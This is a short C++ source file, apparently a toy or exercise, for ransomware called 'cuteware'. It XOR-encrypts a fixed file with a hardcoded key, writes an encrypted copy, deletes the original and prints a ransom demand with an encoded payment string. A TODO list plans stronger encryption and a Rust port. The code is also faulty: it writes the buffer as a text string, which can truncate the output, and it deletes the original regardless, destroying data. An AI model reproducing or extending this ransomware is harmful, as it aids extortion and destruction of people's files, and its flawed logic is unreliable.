// cuteware.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <fstream>
using namespace std;

int main() {
    streampos size;
    char* memblock;
    string originalfile = "file\\secret.txt";

    ifstream file(originalfile, ios::in | ios::binary | ios::ate);
    if (file.is_open())
    {
        size = file.tellg();
        memblock = new char[size];
        file.seekg(0, ios::beg);
        file.read(memblock, size);
        file.close();

        cout << "original file is ready to be encrypted" << endl;

        string key = "L4N4_D4R";

        for (int i = 0; i < size; i++) {
            memblock[i] ^= key[i % 8];
        }

        ofstream encryptedfile("file\\secret.txt.encrypted", ios::out | ios::binary);
        if (encryptedfile.is_open())
        {
            encryptedfile << memblock;
            encryptedfile.close();
            std::remove(&originalfile[0]);
            delete[] memblock;
        }
        else cout << "Unable to write encrypted file" << endl;

        cout << "Pay ransom at: VEhJUyBJUyBGVU4gSVNOJ1QgSVQ/IFlPVSBHT1RUQSBNT1ZFIE9OIFRPIFRIRSBORVhUIEZJTEU" << endl;
    }
    else cout << "Unable to open file" << endl;
    return 0;
}

// TODO: 
//		[+] implement a decryption function
// 		[*] enhance encryption
//		[!] port to Rust